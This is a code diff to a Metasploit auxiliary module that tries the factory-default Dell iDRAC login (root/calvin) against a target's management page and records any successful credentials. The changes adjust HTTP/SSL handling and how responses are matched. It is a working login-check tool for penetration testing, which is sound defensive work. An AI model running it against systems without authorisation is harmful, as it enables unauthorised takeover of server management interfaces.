@@ -33,69 +33,79 @@ class Metasploit3 < Msf::Auxiliary
 				],
 			'License' => MSF_LICENSE
 		)
-		register_options(
-			[Opt::RPORT(443),
+
+		register_options([
 			OptString.new('TARGETURI', [true, 'Path to the iDRAC Administration page', '/data/login']),
 			OptString.new('USERNAME', [true, 'Login name', 'root']),
-			OptString.new('PASSWORD', [true, 'Login credential', 'calvin'])
+			OptString.new('PASSWORD', [true, 'Login credential', 'calvin']),
+			OptInt.new('RPORT', [true, "Default remote port", 443])
+		], self.class)
+
+		register_advanced_options([
+			OptBool.new('SSL', [true, "Negotiate SSL connection", true])
 		], self.class)
 	end
 
 	def target_url
-		"https://#{vhost}:#{rport}#{datastore['URI']}"
+		proto = "http"
+		if rport == 443 or ssl
+			proto = "https"
+		end
+		"#{proto}://#{vhost}:#{rport}#{datastore['URI']}"
 	end
 
 	def run_host(ip)
 
 		print_status("Verifying that login page exists at #{ip}")
 		begin
-		
-			res = send_request_cgi({
+			res = send_request_raw({
 				'method' => 'GET',
-				'uri' => target_uri.path,
-				'SSL' => true
+				'uri' => target_uri.path
 				}, 20)
-			
-			if (res and res.code == 200 and res.body.to_s.match(/<root>/) != nil)
+				
+			if (res and res.code == 200 and res.body.to_s.match(/<authResult>1/) != nil)
 				print_status("Attempting authentication")
-			
-				res = send_request_cgi({
-						'method' => 'POST',
-						'uri' => target_uri.path,
-						'SSL' => true,
-						'vars_post' => {
-							'user' => datastore['USERNAME'],
-							'password' => datastore['PASSWORD']
-						}
-					}, 20)
-					
-				if (res and res.code == 200 and res.body.to_s.match(/<authResult>0<\/authResult>/) != nil)
+				
+				auth = send_request_cgi({
+					'method' => 'POST',
+					'uri' => target_uri.path,
+					'SSL' => true,
+					'vars_post' => {
+						'user' => datastore['USERNAME'],
+						'password' => datastore['PASSWORD']
+					}
+				}, 20)
+				
+				if(auth and auth.body.to_s.match(/<authResult>[0|5]<\/authResult>/) != nil )
 					print_good("#{target_url} - SUCCESSFUL login for user '#{datastore['USERNAME']}' with password '#{datastore['PASSWORD']}'")
 					report_auth_info(
 						:host => ip,
 						:port => rport,
 						:proto => 'tcp',
-						:sname => ('https'),
+						:sname => (ssl ? 'https' : 'http'),
 						:user => datastore['USERNAME'],
 						:pass => datastore['PASSWORD'],
 						:active => true,
 						:source_type => "user_supplied",
 						:duplicate_ok => true
 					)
-				elsif(res and res.code == 200)
-					vprint_error("#{target_url} - Dell iDRAC - Failed to login as '#{datastore['USERNAME']}' with password '#{datastore['PASSWORD']}'")
 				else
-					vprint_error("#{target_url} - Dell iDRAC - Unable to authenticate.")
-					return :abort
+					print_error("#{target_url} - Dell iDRAC - Failed to login as '#{datastore['USERNAME']}' with password '#{datastore['PASSWORD']}'")
 				end
+				
+			elsif (res and res.code == 301)
+				print_error("#{target_url} - Page redirect to #{res.headers['Location']}")
+				return :abort
 			else
 				print_error("The iDRAC login page does not exist at #{ip}")
-			end
-		
+				return :abort
+			end	
+
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-		rescue ::Timeout::Error, ::Errno::EPIPE, ::OpenSSL::SSL::SSLError
+		rescue ::Timeout::Error, ::Errno::EPIPE
+		rescue ::OpenSSL::SSL::SSLError => e
+			return if(e.to_s.match(/^SSL_connect /) ) # strange errors / exception if SSL connection aborted
 		end
-		
 	end
 
 end
